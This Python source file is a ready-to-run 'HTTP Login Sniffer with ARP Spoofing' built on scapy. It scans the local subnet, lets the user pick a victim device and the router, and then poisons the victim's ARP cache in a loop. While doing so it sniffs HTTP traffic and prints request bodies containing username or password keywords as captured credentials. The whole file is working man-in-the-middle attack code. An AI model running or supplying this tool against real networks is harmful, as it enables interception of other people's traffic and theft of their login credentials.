import subprocess
from scapy.all import *  #sniffing, and network analysis.
from scapy.layers.l2 import arping, Ether, ARP  
from scapy.layers.http import HTTPRequest
import os
import sys    #system-specific parameters
import threading
import time
import psutil
import socket

def print_network_interfaces():
    interfaces = psutil.net_if_addrs()
    sl_no = 1 

    for interface, addrs in interfaces.items():
        ipv4_found = False 
        ipv6_found = False 
        ipv4_addresses = [] 
        ipv6_addresses = []  
       
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ipv4_addresses.append(f"{addr.address}/{addr.netmask}")
                ipv4_found = True
            elif addr.family == socket.AF_INET6:
                ipv6_addresses.append(f"{addr.address}/{addr.netmask}")
                ipv6_found = True

        # If any address type (IPv4 or IPv6) was found, print the interface
        if ipv4_found or ipv6_found:
            print(f"{sl_no}. {interface} ->")
            sl_no += 1  # Increment serial number
           
            # Print all IPv4 addresses if found
            if ipv4_found:
                for ip in ipv4_addresses:
                    print(f"\tIPv4: {ip}")
           
            # Print all IPv6 addresses if found
            if ipv6_found:
                for ip in ipv6_addresses:
                    print(f"\tIPv6: {ip}")
               
            print("\n") 
       
    if sl_no == 1:
        print("No valid IP addresses found on any interface.")
        sys.exit(1)


def check_internet_connection():
    """
    Checks if there is an active internet connection
    """
    try:
        subprocess.check_call(['ping', '-c', '1', '8.8.8.8'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def check_network_strength():
    """
    Checks network strength by pinging a reliable server
    """
    print("[*] Checking network strength...")
    try:
        response = subprocess.run(
            ['ping', '-c', '4', '8.8.8.8'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        result = response.stdout.decode()
        if "0% packet loss" in result:
            print("[*] Network strength is good.")
        else:
            print("[-] Network strength is poor. Please check your connection.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Failed to check network strength: {e}")
        sys.exit(1)

def get_mac(ip):
    """
    Returns the MAC address of the given IP
    """
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src
    return None

def scan_network(ip_range):
    """
    Scans the network and returns a list of devices
    """
    ans, unans = arping(ip_range)
    devices = []
    for s, r in ans:
        devices.append((r.psrc, r.hwsrc))
    return devices

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not get MAC address for {target_ip}")
        return

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    ether = Ether(dst=target_mac)
    packet = ether / arp_response

    while True:
        sendp(packet, verbose=0)
        time.sleep(2)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        print(f"[-] Could not get MAC address for {target_ip} or {host_ip}")
        return
   
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, count=4, verbose=0)

def sniff_packets(interface):
    print(f"\n[*] Sniffing on {interface}")
    sniff(iface=interface, prn=process_packet, store=False)

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f"[*] {method} Request to {url}")

        if packet.haslayer(Raw):
            load = packet[Raw].load.decode()
            keywords = ["username", "user", "login", "password", "pass"]
            if any(keyword in load for keyword in keywords):
                print(f"[*] Possible credentials: {load}\n\n")

if __name__ == "__main__":
    if not check_internet_connection():
        print("*********************************************************")
        print("*                                                       *")
        print("*              No Internet Connection                   *")
        print("*                                                       *")
        print("*   Please check your network settings and try again.   *")
        print("*                                                       *")
        print("*********************************************************")
        sys.exit(1)
       
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Login Sniffer with ARP Spoofing")
    args = parser.parse_args()

    print_network_interfaces()
    while True:
        try:
            interface_index = int(input("Enter the S.No of the interface to sniff on: ")) - 1
            interfaces = get_if_list()
            if interface_index < 0 or interface_index >= len(interfaces):
                raise IndexError
            break
        except (ValueError, IndexError):
            print("[-] Invalid selection. Please select a valid S.No from the list.\n")

    selected_interface = interfaces[interface_index]

    try:
        interface_ip = get_if_addr(selected_interface)
        if interface_ip == '0.0.0.0':
            raise ValueError("Interface is not configured with a valid IP address.")
    except Exception as e:
        print(f"[-] Failed to get IP address for interface {selected_interface}: {e}")
        sys.exit(1)

    check_network_strength()

    ip_range = f"{interface_ip.rsplit('.', 1)[0]}.0/24"
    print(f"Scanning IP range: {ip_range}\n")
   
    devices = scan_network(ip_range)

    if not devices:
        print("[-] No devices found in the network. Terminating the program.")
        sys.exit(1)
    else:
        print("\nAvailable devices in the network:\n")
        print("S.No\tIP Address\t\tMAC Address")
        print("-------------------------------------------------")
        for i, (ip, mac) in enumerate(devices, start=1):
            print(f"{i}\t{ip}\t\t{mac}")
        print("-------------------------------------------------\n")

    while True:
        try:
            target_index = int(input("Enter the S.No of the target IP address to spoof: ")) - 1
            if target_index < 0 or target_index >= len(devices):
                raise IndexError
            break
        except (ValueError, IndexError):
            print("[-] Invalid selection. Please select a valid S.No from the list.\n")

    while True:
        try:
            router_index = int(input("Enter the S.No of the router IP address: ")) - 1
            if router_index < 0 or router_index >= len(devices):
                raise IndexError
            if target_index == router_index:
                print("[-] Target IP and Router IP cannot be the same. Please choose different devices.\n")
                continue
            break
        except (ValueError, IndexError):
            print("[-] Invalid selection. Please select a valid S.No from the list.\n")

    target_ip = devices[target_index][0]
    router_ip = devices[router_index][0]

    try:
        # Start ARP spoofing in a separate thread
        spoof_thread = threading.Thread(target=spoof, args=(target_ip, router_ip))
        spoof_thread.start()

        # Start sniffing packets
        sniff_packets(selected_interface)
    except KeyboardInterrupt:
        print("\n[*] Detected CTRL+C! Restoring network...")
        restore(target_ip, router_ip)
        sys.exit(0)